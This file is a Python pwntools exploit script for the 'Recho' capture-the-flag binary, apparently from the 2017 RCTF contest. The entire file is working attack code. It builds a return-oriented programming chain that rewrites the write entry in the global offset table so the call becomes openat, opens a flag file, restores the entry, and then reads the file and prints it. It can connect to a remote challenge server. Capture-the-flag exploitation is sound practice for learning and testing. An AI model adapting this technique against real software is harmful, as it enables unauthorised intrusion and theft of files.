# coding:utf-8
from pwn import *
import time, sys


run_argv = []
# local process envirnoment
# socat tcp-listen:22333,reuseaddr,fork system:./Recho
LOCAL = True
elf_name = "./Recho"

#retmote args
# remote_host = "127.0.0.1"
#
remote_host = "recho.2017.teamrois.cn"
remote_port = 9527

elf = ELF(elf_name)
#context.clear(arch="i386")
context.clear(arch="amd64")

pop_rdi = 0x4008A3
add_bvrdi = 0x000000000040070d
pop_rax = 0x00000000004006fc
pop_rdx = 0x00000000004006fe
pop_rsi_r15 = 0x00000000004008a1
bss_addr = 0x601060

if LOCAL:
    context.log_level = "debug"
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    context.log_level = "debug"
    io = remote(remote_host, remote_port)

def msend_str(length, mstring):
    io.send(str(length))
    time.sleep(0.05)
    io.send(mstring)
    time.sleep(0.05)

def s_exp():
    pause()
    io.recvuntil("Welcome to Recho server!\n")
    # change write to openat
    payload = 'a'*(0x30) + p64(0x400791)
    payload += p64(pop_rdi) + p64(elf.got['write'])
    payload += p64(pop_rax) + p64(0x40)
    payload += p64(add_bvrdi)       # ?[write] += 0x40
    payload += p64(pop_rdi) + p64(elf.got['write']+1)
    payload += p64(pop_rax) + p64(0xff)
    payload += p64(add_bvrdi)       # ?[write+1] += 0xff

    # openat(0xffffff9c, "flag", 0)
    payload += p64(pop_rdi) + p64(0xffffff9c)
    payload += p64(pop_rdx) + p64(0x0)
    payload += p64(elf.plt['write'])

    # change openat to write
    payload += p64(pop_rdi) + p64(elf.got['write'])
    payload += p64(pop_rax) + p64(0xc0)
    payload += p64(add_bvrdi)
    payload += p64(pop_rdi) + p64(elf.got['write']+1)
    payload += p64(pop_rax) + p64(1)
    payload += p64(add_bvrdi)

    # read(3, bss, 0x100)
    payload += p64(pop_rdi) + p64(3)
    payload += p64(pop_rsi_r15) + p64(bss_addr) + 'f'*0x08
    payload += p64(pop_rdx) + p64(0x100)
    payload += p64(elf.plt['read'])

    # write(1, bss, 0x100)
    payload += p64(pop_rdi) + p64(1)
    payload += p64(elf.plt['write'])

    msend_str(len(payload), payload)
    time.sleep(0.05)
    io.send("flag")
    io.shutdown()
    print io.recv(0x100)

if __name__ == "__main__":
    log.info("process:"+str(io))
    s_exp()
    pause()
